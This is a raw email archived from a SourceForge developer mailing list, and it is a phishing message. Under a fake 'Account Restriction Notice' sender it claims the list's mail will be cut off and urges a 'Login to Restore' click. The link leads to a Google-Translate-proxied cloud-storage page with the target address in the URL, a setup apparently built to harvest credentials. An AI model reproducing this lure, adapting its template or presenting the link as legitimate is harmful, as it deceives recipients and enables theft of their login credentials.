Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 6BE5859CE1A
	for <lists+industrypack-devel@lfdr.de>; Tue, 23 Aug 2022 03:52:30 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1oQJ5g-0001u5-JW
	for lists+industrypack-devel@lfdr.de;
	Tue, 23 Aug 2022 01:52:28 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <develop@datora.jp>) id 1oQJ5f-0001tz-H0
 for industrypack-devel@lists.sourceforge.net;
 Tue, 23 Aug 2022 01:52:27 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=MIME-Version:Date:Content-Transfer-Encoding:
 Message-ID:Subject:To:From:Content-Type:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Ee/E4pvTkzuCkNpjTcz/cFn5mKHKh0+u6uaSz712iSU=; b=WcXic4kDjbhs+pGrs794Bge62x
 xnI7jjIvh16lNHtXkg5LQjavz4BnwBgIZuMQjiMhlmZQw3b8vItne89Lx2YC/mnjKGSZl87SOrxjY
 Nxfwl4zM7qObBD7TTBxP9Ak1MdCvRBzjGPYzquCIUbqKn0gydZj4e8OUJX/CuKe3EPMI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=MIME-Version:Date:Content-Transfer-Encoding:Message-ID:Subject:To:From:
 Content-Type:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Ee/E4pvTkzuCkNpjTcz/cFn5mKHKh0+u6uaSz712iSU=; b=P
 NMMfsuW7VXt9SBcUS+UyOw/1V0CmHRgigF/ERSwvG9y0Ybsi9P/ZMrmXq3aSII+I9HnAOeH0eVxf0
 zu//XNtXktslZeNExck8wSoT7te5rlw3/6jYEVJj7rOO9citObfW9xlaFGU2Ye/FGPXbsj/XADuHb
 GjY8WC6UX8UtOS30=;
Received: from mail.datora.jp ([35.72.54.164])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1oQJ5e-0003kv-Lx for industrypack-devel@lists.sourceforge.net;
 Tue, 23 Aug 2022 01:52:27 +0000
Received: from [127.0.0.1] (unknown [147.124.217.192])
 (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 (No client certificate requested)
 by mail.datora.jp (Postfix) with ESMTPSA id E6453945B42
 for <industrypack-devel@lists.sourceforge.net>;
 Tue, 23 Aug 2022 10:51:57 +0900 (JST)
From: "Lists|_Restiction Notice5850563279" <develop@datora.jp>
To: industrypack-devel@lists.sourceforge.net
Message-ID: <7714120d-96e9-ffb8-5b88-05b38e89e4d6@datora.jp>
X-Priority: 1 (Highest)
X-Msmail-Priority: High
Importance: High
Date: Tue, 23 Aug 2022 01:51:55 +0000
MIME-Version: 1.0
X-Spam-Score: 1.9 (+)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Account Restriction Notice!!!! Affected ID:
 industrypack-devel@lists.sourceforge.net
 You will no longer receive incoming and outgoing messages as at 2022-08-22
 18:51. Content analysis details:   (1.9 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [35.72.54.164 listed in wl.mailspike.net]
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.8 MISSING_MIMEOLE        Message has X-MSMail-Priority, but no X-MimeOLE
X-Headers-End: 1oQJ5e-0003kv-Lx
Subject: [Industrypack-devel] Account Restriction Notice!!!! You Have Been
 Warned
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5161399552889001783=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5161399552889001783==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD><meta http-equiv=3D"Content-Type" content=3D"text/html; =
charset=3Diso-8859-1">
<title></title></HEAD>
<BODY>
<TABLE role=3Dmodule=20
style=3D'FONT-SIZE: 14px; FONT-FAMILY: " Sans", =
Roboto, RobotoDraft, Helvetica, Arial, sans-serif; TABLE-LAYOUT: fixed'=20
cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
 =20
  <TR>
    <TD role=3Dmodule-content=20
    style=3D"PADDING-BOTTOM: 18px; =
PADDING-TOP: 18px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 22px; =
PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255)"=20
    bgColor=3D#ffffff height=3D"100%" vAlign=3Dtop>
      <DIV style=3D"FONT-FAMILY: arial, helvetica, sans-serif">
      <DIV style=3D"FONT-FAMILY: inherit; TEXT-ALIGN: =
center"><B>&nbsp;Account=20
      Restriction Notice!!!!=
</B><BR><BR>Affected=20
  ID:&nbsp;industrypack-devel@lists.sourceforge.=
net</DIV></DIV></TD></TR></TABLE>
<TABLE role=3Dmodule=20
style=3D'FONT-FAMILY: ns", Roboto, RobotoDraft, Helvetica, Arial, =
sans-serif; font-size: 14px; table-layout: fixed;'=20
cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
 =20
  <TR>
    <TD role=3Dmodule-content=20
    style=3D"PADDING-BOTTOM: 0px; =
PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"=20
    height=3D"100%" vAlign=3Dtop>
      <TABLE=20
      style=3D"FONT-SIZE:=
 1px; LINE-HEIGHT: 1px" height=3D1 cellSpacing=3D0=20
      cellPadding=3D0 width=3D"100%" align=3Dcenter border=3D0>
       =20
        <TR>
          <TD=20
          style=3D"PADDING-BOTTOM: 1px; =
PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"=20
          bgColor=3D#c6c6c6>&nbsp;</TD></TR></TABLE></TD></TR></TABLE>
<TABLE role=3Dmodule=20
style=3D'FONT-FAMILY: &amp;quSans", Roboto, =
RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14px; table-layout: =
fixed;'=20
cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
 =20
  <TR>
    <TD role=3Dmodule-content=20
    style=3D"PADDING-BOTTOM: 18px; =
PADDING-TOP: 18px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 22px; =
PADDING-RIGHT: 0px"=20
    height=3D"100%" vAlign=3Dtop>
      <DIV style=3D"FONT-FAMILY: arial, helvetica, sans-serif">
      <DIV style=3D"FONT-FAMILY: inherit; TEXT-ALIGN: center">You will no =
longer=20
      receive incoming and outgoing messages as =
at&nbsp;2022-08-22=20
      18:51<STRONG>.</STRONG><BR><BR><BR>Log in =
immediately to resolve=20
      this&nbsp;glitch &nbsp;by following the =
instructions=20
  below</DIV></DIV></TD></TR></TABLE>
<TABLE role=3Dmodule=20
style=3D'FONT-SIZE: 14px; FONT-FAMILY: " Sans", =
Roboto, RobotoDraft, Helvetica, Arial, sans-serif; TABLE-LAYOUT: fixed'=20
cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
 =20
  <TR>
    <TD=20
    style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"=20
    align=3Dcenter>
      <TABLE=20
      class=3D"m_6519955178834683010wrapper-mobile"=20
      cellSpacing=3D0 cellPadding=3D0 border=3D0>
       =20
        <TR>
          <TD=20
          style=3D"FONT-SIZE: 16px; TEXT-ALIGN: center; =
MARGIN: 0px; border-radius: 6px"=20
          bgColor=3D#3898d9 =
align=3Dcenter><A=20
            style=3D"FONT-SIZE: 14px; BORDER-TOP: =
rgb(56,152,217) 1px solid; BORDER-RIGHT: rgb(56,152,217) 1px solid; =
BORDER-BOTTOM: rgb(56,152,217) 1px solid; COLOR: rgb(255,255,255); =
PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-LEFT: 18px; BORDER-LEFT: =
rgb(56,152,217) 1px solid; DISPLAY: inline-block; LETTER-SPACING: 0px; =
LINE-HEIGHT: 7px; PADDING-RIGHT: 18px; border-radius: 0px"=20
            href=3D"https://storageapi-fleek-co.translate.=
goog/5dca2b2b-4107-4e4e-9c91-07d7bf43d650-bucket/gbenusii/DecodeWPA.html?=
_x_tr_sl=3Dauto&_x_tr_tl=3Den&_x_tr_hl=3Den-US&_x_tr_pto=3Dwapp#industrypac=
k-devel@lists.sourceforge.net">Login=20
            to =
Restore</A></TD></TR></TABLE></TD></TR></TABLE></BODY></HTML>


--===============5161399552889001783==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5161399552889001783==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5161399552889001783==--
